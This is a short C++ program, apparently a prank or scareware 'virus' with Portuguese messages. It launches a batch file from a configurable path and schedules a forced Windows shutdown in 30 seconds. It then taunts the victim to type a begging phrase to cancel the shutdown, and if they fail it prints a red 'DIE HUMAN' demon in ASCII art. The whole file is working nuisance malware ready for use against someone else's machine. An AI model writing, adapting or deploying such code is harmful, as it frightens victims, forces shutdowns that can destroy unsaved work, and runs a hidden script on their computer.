#include<stdio.h>
#include<iostream>
#include<stdlib.h>
using namespace std;

void punicao();
int main(){
    string code;
    bool ok = false;
    system("E:/dump/SabrinaVirus/sabrina.bat");                 //Edite o caminho até o arquivo
    system("shutdown -s -t 30");
    cout << "implore para sabrina parar AHHAHAHAHAHAHHA" << endl;
    cout << "fale (sabrina por favor pare)" << endl;
    for(int i=0; i<5; i++){
        cout << "voce tem " << (5-i) << " tentativas \n";
        std::getline(cin, code);
        if(code == "sabrina por favor pare"){
        	cout << "sabrina foi embora \n";
            system("shutdown -a"); 
            ok = true;
            break;
        }
    }
    cout << endl;
    system("cls");
    if (ok==false){std::cout << "voce falhou em implorar por piedade, seu pc vai morrer\n"; punicao();}
    return 0;
}

void punicao(){
system("color 04");
cout << endl;
cout << endl;
cout <<"         .                                                      ."<<endl;
cout <<"        .n                   .                 .                  n."<<endl;
cout <<"  .   .dP                  dP                   9b                 9b.    ."<<endl;
cout <<" 4    qXb         .       dX                     Xb       .        dXp     t"<<endl;
cout <<"dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb"<<endl;
cout <<"9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP"<<endl;
cout <<" 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP"<<endl;
cout <<"  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'"<<endl;
cout <<"    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'"<<endl;
cout <<"        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~"<<endl;
cout <<"                        )b.  .dbo.dP'`v'`9b.odb.  .dX("<<endl;
cout <<"                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb."<<endl;
cout <<"                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb"<<endl;
cout <<"                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb"<<endl;
cout <<"                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP"<<endl;
cout <<"                     `'      9XXXXXX(   )XXXXXXP      `'"<<endl;
cout <<"                              XXXX X.`v'.X XXXX"<<endl;
cout <<"                              XP^X'`b   d'`X^XX"<<endl;
cout <<"                              X. 9  `   '  P )X"<<endl;
cout <<"                              `b  `       '  d'"<<endl;
cout <<"                               `             '"<<endl;
}

